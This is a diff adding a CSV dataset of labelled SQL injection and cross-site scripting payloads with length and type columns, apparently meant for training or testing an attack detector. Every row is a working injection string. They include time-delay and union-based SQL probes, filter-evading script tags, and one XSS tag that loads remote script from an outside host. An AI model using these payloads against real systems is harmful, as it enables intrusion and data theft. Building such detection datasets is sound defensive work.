@@ -1,0 +1,36 @@
+payload,length,attack_type,label
+"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",116,sqli,anom
+"-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#",66,sqli,anom
+1')));select pg_sleep(5)--,26,sqli,anom
+"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)-- pvdw",82,sqli,anom
+"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",60,sqli,anom
+"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",144,sqli,anom
+"1%""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",80,sqli,anom
+"-7776') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ihof'='ihof",220,sqli,anom
+"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",90,sqli,anom
+1')) as pdcl where 6964=6964;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,112,sqli,anom
+"-5317')) union all select 7673,7673,7673,7673,7673,7673#",56,sqli,anom
+"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",97,sqli,anom
+"1'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli,anom
+"1'))) union all select null,null,null,null,null,null,null,null,null,null#",73,sqli,anom
+"1')) and elt(6847=5874,5874) and (('yspu'='yspu",47,sqli,anom
+1%') and (7704=3494)*3494 and ('%'=',36,sqli,anom
+-7663')) or 1558=1104 and (('wsrq'='wsrq,40,sqli,anom
+"-9996' or make_set(1237=7111,7111)",34,sqli,anom
+"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""pnsz"" like ""pnsz",74,sqli,anom
+"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",80,xss,anom
+"</textarea>'""><script>alert(xss)</script>",41,xss,anom
+"'""""><script language=""javascript""> alert('x s s');</script>",59,xss,anom
+</script></script><<<<script><>>>><<<script>alert(xss)</script>,63,xss,anom
+<html><noalert><noscript>(xss)</noscript><script>(xss)</script>,63,xss,anom
+'></select><script>alert(xss)</script>,38,xss,anom
+}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,60,xss,anom
+"<script>document.write(""xss"");</script>",39,xss,anom
+"a=""get"";b=""url"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",64,xss,anom
+"='><script>alert(""xss"")</script>",32,xss,anom
+"<body background=javascript:'""><script>alert(xss)</script>></body>",66,xss,anom
+"data:text/html;charset=utf-7;base64,ij48l3rpdgxlpjxzy3jpchq+ywxlcnqomtmznyk8l3njcmlwdd4=",88,xss,anom
+<script>alert('xss');</script>,30,xss,anom
+<script id=xss src=http://ha.ckers.org/xss.js></script>,55,xss,anom
+"<img id=xss src=`javascript:alert(""rsnake says, 'xss'"")`>",57,xss,anom
+id=xss src= <img 6;avascript:alert('xss')>,42,xss,anom
